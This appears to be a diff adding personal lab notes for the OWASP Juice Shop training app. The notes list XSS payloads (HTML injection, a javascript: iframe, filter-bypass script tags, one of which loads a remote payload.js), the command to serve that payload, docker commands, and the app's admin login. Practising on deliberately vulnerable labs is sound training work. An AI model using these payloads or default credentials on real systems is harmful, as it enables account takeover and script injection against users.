@@ -1,0 +1,8 @@
+<<b>bb>hi</b> :username bold
+<iframe src="javascript:alert('xss')"> : DOM XSS
+<<script><sscript>alert('xss')</script> : username alert
+<<script><sscript src="http://localhost:8000/payload.js"></script> :XSS script injection
+python -m http.server 8000
+sudo docker ps
+sudo docker stop
+admin@juice-sh.op admin123
